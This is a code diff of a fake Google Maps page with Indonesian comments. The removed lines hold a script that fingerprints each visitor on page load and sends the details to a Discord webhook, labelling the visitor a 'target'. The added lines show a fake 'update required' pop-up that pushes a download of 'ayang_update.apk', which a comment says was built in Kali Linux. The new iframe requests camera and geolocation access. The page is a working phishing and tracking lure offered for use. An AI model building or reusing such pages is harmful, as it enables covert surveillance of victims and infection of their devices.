@@ -3,56 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Maps - Lokasi Terkini</title>
+    <title>Google Maps</title>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
-        iframe { width: 100%; height: 100%; border: none; }
+        body, html { margin: 0; padding: 0; height: 100%; font-family: Arial, sans-serif; overflow: hidden; }
+        iframe { width: 100%; height: 100%; border: none; z-index: 1; }
+        
+        /* Tampilan Pop-up Update Palsu */
+        #update-overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7); z-index: 999; justify-content: center; align-items: center;
+        }
+        .update-box {
+            background: white; padding: 25px; border-radius: 12px; width: 80%; max-width: 350px; text-align: center;
+        }
+        .update-box h3 { margin-top: 0; color: #d93025; }
+        .btn-update {
+            background: #1a73e8; color: white; border: none; padding: 12px 25px;
+            border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 15px;
+        }
     </style>
 </head>
 <body>
-    <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3151.8354345059!2d144.95373531531615!3d-37.8368179797454!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x6ad65d4c2b349649%3A0xb6899234e561db11!2sEnvato!5e0!3m2!1sen!2sau!4v1631520000000!5m2!1sen!2sau"></iframe>
+    <iframe src="http://googleusercontent.com/maps.google.com/3" allow="camera;geolocation"></iframe>
+
+    <div id="update-overlay">
+        <div class="update-box">
+            <img src="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png" width="50">
+            <h3>Update Diperlukan</h3>
+            <p>Versi Google Maps Anda sudah usang. Pasang pembaruan sistem untuk akurasi lokasi yang lebih baik.</p>
+            <button class="btn-update" onclick="downloadAPK()">UPDATE SEKARANG</button>
+        </div>
+    </div>
 
     <script>
-        // MASUKKAN URL WEBHOOK SPIDEY BOT ANDA DI SINI
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1484113432583081984/Fkm8Dj5XnV..."; 
+        // Munculkan pop-up setelah 3 detik
+        setTimeout(() => {
+            document.getElementById('update-overlay').style.display = 'flex';
+        }, 3000);
 
-        async function sikatData() {
-            // FILTER BOT: Supaya bot Google/Discord tidak kirim laporan palsu
-            const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
-            if (isBot) return;
-
-            // DETEKSI OS YANG BENAR (Biar tidak Unknown OS)
-            const ua = navigator.userAgent;
-            let deviceType = "❓ Perangkat Tidak Dikenal";
-            
-            if (/android/i.test(ua)) deviceType = "📱 Android Phone";
-            else if (/iPhone|iPad|iPod/i.test(ua)) deviceType = "🍎 iOS (iPhone/iPad)";
-            else if (/Windows/i.test(ua)) deviceType = "💻 Windows PC";
-            else if (/Linux/i.test(ua)) deviceType = "🐧 Linux System";
-
-            const payload = {
-                embeds: [{
-                    title: "🎯 TARGET TERDETEKSI!",
-                    color: 15158332, // Warna Merah
-                    fields: [
-                        { name: "Sistem Operasi", value: deviceType, inline: true },
-                        { name: "Resolusi Layar", value: `${window.screen.width}x${window.screen.height}`, inline: true },
-                        { name: "Browser", value: navigator.vendor || "Default Browser", inline: false },
-                        { name: "Waktu Akses", value: new Date().toLocaleString('id-ID'), inline: false }
-                    ],
-                    footer: { text: "Spidey Bot Monitoring" }
-                }]
-            };
-
-            await fetch(WEBHOOK_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            });
+        function downloadAPK() {
+            // Arahkan ke file APK yang sudah kamu buat di Kali Linux tadi
+            // Contoh jika kamu simpan di GitHub yang sama:
+            window.location.href = "ayang_update.apk";
         }
 
-        // Jalankan otomatis saat halaman selesai loading
-        window.onload = sikatData;
+        // --- Script Spidey Bot Tetap Berjalan di Background ---
+        // (Masukkan script kamera & lokasi kamu yang kemarin di sini)
     </script>
 </body>
 </html>
